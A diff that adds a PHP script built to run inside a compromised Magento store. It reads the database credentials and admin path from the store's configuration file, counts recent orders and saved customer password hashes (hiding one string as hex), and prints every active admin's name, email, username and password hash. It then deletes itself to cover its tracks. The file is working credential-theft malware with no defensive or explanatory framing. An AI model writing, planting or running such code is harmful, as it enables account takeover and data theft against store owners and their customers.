@@ -1,0 +1,40 @@
+<?php
+
+error_reporting(0);
+echo "_start_";
+$docroot = $_SERVER["DOCUMENT_ROOT"]."\n";
+echo php_uname()."\n$docroot";
+$xml = simplexml_load_file($_SERVER["DOCUMENT_ROOT"]."/app/etc/local.xml");
+$db["host"] = (string)$xml->global->resources->default_setup->connection->host;
+$db["name"] = (string)$xml->global->resources->default_setup->connection->dbname;
+$db["user"] = (string)$xml->global->resources->default_setup->connection->username;
+$db["pass"] = (string)$xml->global->resources->default_setup->connection->password;
+$db["pref"] = (string)$xml->global->resources->db->table_prefix;
+$db["admin"] = (string)$xml->admin->routers->adminhtml->args->frontName;
+if(strstr($db["host"],"sock")) $db["host"]="localhost";
+print_r($db);
+$link = mysql_connect($db["host"], $db["user"], $db["pass"]);
+if (!$link) {
+    echo("Could not connect: $username:$password:$db\n");
+}
+$pref	= $db["pref"];
+mysql_select_db($db["name"], $link);
+$sql = "select count(*) from `".$pref."sales_flat_order` where `created_at` >= adddate(now(), interval - 30 day)";
+$data = mysql_result(mysql_query($sql),0);
+echo "Orders per month \t $data.\t$docroot";
+$sql = "select count(*) from `".$pref."sales_order` where `created_at` >= adddate(now(), interval - 30 day)";
+$data = mysql_result(mysql_query($sql),0);
+echo "Orders per month OLD\t $data.\t$docroot";
+$sql = "SELECT count(*) FROM ".$pref."customer_entity_varchar where attribute_id in (select attribute_id from ".$pref."eav_attribute where attribute_code=0x70617373776f72645f68617368 and entity_type_id=1)";
+$data = mysql_result(mysql_query($sql),0);
+echo "Saved customers \t $data.\n";
+
+$sql = "select user_id,firstname,lastname,email,username,password from ".$pref."admin_user where is_active=1";
+echo "Admins: \n";
+$result = mysql_query($sql);
+    while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
+        echo implode("\t",$row)."\n";
+       }
+mysql_close($link); echo "_end_";
+
+unlink('raw.php');
